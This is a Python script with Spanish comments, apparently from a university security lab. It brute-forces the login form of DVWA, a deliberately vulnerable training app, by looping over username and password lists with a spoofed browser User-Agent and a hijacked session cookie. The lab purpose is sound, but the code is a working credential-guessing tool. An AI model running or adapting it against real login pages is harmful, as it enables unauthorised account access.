#!/usr/bin/env python3
"""
Script de fuerza bruta para DVWA - Contexto educativo/investigación
Desarrollado para el Laboratorio 2 - Sección 4

Este script demuestra técnicas de ataque de fuerza bruta contra formularios web
utilizando la librería requests de Python. Está diseñado específicamente para
interactuar con DVWA (Damn Vulnerable Web App) en un entorno controlado.

Uso: python3 brute_force_script.py
"""

import requests
import time
import sys

class DVWABruteForcer:
    """
    Clase para realizar ataques de fuerza bruta contra DVWA.
    """
    
    def __init__(self, base_url="http://localhost", phpsessid=None, security="low"):
        """
        Inicializa el atacante de fuerza bruta.
        
        Args:
            base_url (str): URL base de DVWA.
            phpsessid (str): Valor de la cookie PHPSESSID.
            security (str): Nivel de seguridad de DVWA ('low', 'medium', 'high').
        """
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.login_url = f"{self.base_url}/vulnerabilities/brute/"
        
        # Headers HTTP importantes para simular un navegador real
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        
        # Configurar la cookie de sesión, que es CRÍTICA para el ataque
        if phpsessid:
            self.session.cookies.set('PHPSESSID', phpsessid)
            self.session.cookies.set('security', security)
    
    def attempt_login(self, username, password):
        """
        Intenta realizar login con credenciales específicas.
        
        Args:
            username (str): Nombre de usuario a probar.
            password (str): Contraseña a probar.
            
        Returns:
            tuple: (bool success, str response_text)
        """
        # Parámetros para el formulario GET de DVWA brute force
        params = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        try:
            # Realizar petición GET al formulario
            response = self.session.get(self.login_url, params=params, timeout=5)
            response.raise_for_status() # Lanza un error para códigos 4xx/5xx
            
            # Verificar si el login fue exitoso basándose en el contenido de la respuesta
            if "Welcome to the password protected area" in response.text:
                return True, "Login exitoso"
            elif "Username and/or password incorrect" in response.text:
                return False, "Credenciales incorrectas"
            else:
                return False, "Respuesta inesperada del servidor"
                
        except requests.exceptions.Timeout:
            return False, "Error de conexión: Timeout"
        except requests.exceptions.RequestException as e:
            return False, f"Error de conexión: {str(e)}"
    
    def brute_force_attack(self, usernames, passwords, delay=0.2):
        """
        Ejecuta el ataque de fuerza bruta.
        
        Args:
            usernames (list): Lista de nombres de usuario a probar.
            passwords (list): Lista de contraseñas a probar.
            delay (float): Tiempo de espera entre intentos (segundos).
            
        Returns:
            list: Lista de tuplas (username, password) válidas encontradas.
        """
        valid_credentials = []
        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0
        
        print(f"[INFO] Iniciando ataque de fuerza bruta...")
        print(f"[INFO] Usuarios: {len(usernames)}, Contraseñas: {len(passwords)}")
        print(f"[INFO] Total de combinaciones a probar: {total_attempts}")
        print(f"[INFO] URL objetivo: {self.login_url}")
        print(f"[INFO] Delay entre intentos: {delay}s")
        print("-" * 60)

        for username in usernames:
            for password in passwords:
                current_attempt += 1

                progress = (current_attempt / total_attempts) * 100
                sys.stdout.write(
                    f"\r[{current_attempt:04d}/{total_attempts:04d}] Probando {username}:{password}... "
                    + " " * 20
                )
                sys.stdout.flush()

                success, _ = self.attempt_login(username, password)

                if success:
                    sys.stdout.write("\r" + " " * 80 + "\r")
                    print(f"[SUCCESS] ✓ Credenciales válidas encontradas: {username}:{password}")
                    valid_credentials.append((username, password))

                if delay > 0:
                    time.sleep(delay)

        print("\n" + "-" * 60)
        return valid_credentials

def main():
    """
    Función principal del script.
    """
    print("="*80)
    print("SCRIPT DE FUERZA BRUTA - DVWA")
    print("="*80)
    print("\n" + "="*80)
    print("EJECUCIÓN DEL ATAQUE DE FUERZA BRUTA")
    print("="*80)
    
    base_url = input("=> Ingrese la URL base de DVWA (ej. http://localhost:8889): ").strip()
    phpsessid = input("=> Ingrese su cookie PHPSESSID: ").strip()
    security = input("=> Ingrese el nivel de seguridad (low/medium/high) [low]: ").strip() or "low"
    
    if not base_url or not phpsessid:
        print("\n[ERROR] La URL base y la cookie PHPSESSID son obligatorias. Abortando.")
        return

    # Listas de usuarios y contraseñas para el ataque
    usernames = ['admin', 'gordonb', '1337', 'pablo', 'smithy']
    passwords = ['password', 'admin', 'letmein', 'qwerty', '123456']
    
    print(f"\n[INFO] Listas cargadas: {len(usernames)} usuarios, {len(passwords)} contraseñas.")
    
    brute_forcer = DVWABruteForcer(base_url, phpsessid, security)
    valid_creds = brute_forcer.brute_force_attack(usernames, passwords)
    
    print("\n" + "="*80)
    print("RESULTADOS DEL ATAQUE")
    print("="*80)
    
    if valid_creds:
        print(f"[SUCCESS] Se encontraron {len(valid_creds)} combinaciones válidas:")
        for i, (username, password) in enumerate(valid_creds, 1):
            print(f"  {i}. Usuario: '{username}' | Contraseña: '{password}'")
    else:
        print("[INFO] No se encontraron credenciales válidas. Verifique:")
        print("  - Que DVWA esté corriendo en la URL especificada.")
        print("  - Que la cookie PHPSESSID sea correcta y no haya expirado.")
        print("  - Que el nivel de seguridad coincida.")
        print("  - Que las credenciales estén en las listas utilizadas.")
    
    print("\n[INFO] Ataque completado.")

if __name__ == "__main__":
    main()
